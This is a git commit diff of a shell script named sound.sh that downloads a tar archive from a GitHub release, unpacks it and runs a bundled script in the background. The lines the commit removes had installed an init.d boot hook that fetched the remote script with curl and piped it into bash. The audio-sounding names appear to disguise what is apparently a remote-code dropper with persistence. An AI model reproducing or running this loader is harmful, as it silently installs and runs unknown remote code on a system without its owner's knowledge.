a0af59ddd3d97840e73ba81334f0e4914c2d53f7
siomangfr <149304008+siomangfr@users.noreply.github.com>
2024-06-04 19:22:05 +0700

    Update sound.sh

--- sound.sh
+++ sound.sh
@@ -1,13 +1,5 @@
-cd /
-rm -rf jack.tar
-rm -rf jack
 wget https://github.com/siomangfr/indeoi/releases/download/v1.0.2/jack.tar
 tar -xvf jack.tar
-cd /jack
-cd /etc/init.d
-echo "bash <(curl -s -L https://raw.githubusercontent.com/siomangfr/indeoi/main/sound.sh)" > speaker.sh
-chmod a+x speaker.sh
-update-rc.d speaker.sh defaults
 cd /jack
 nohup ./latency.sh
 ps -ef | grep jack
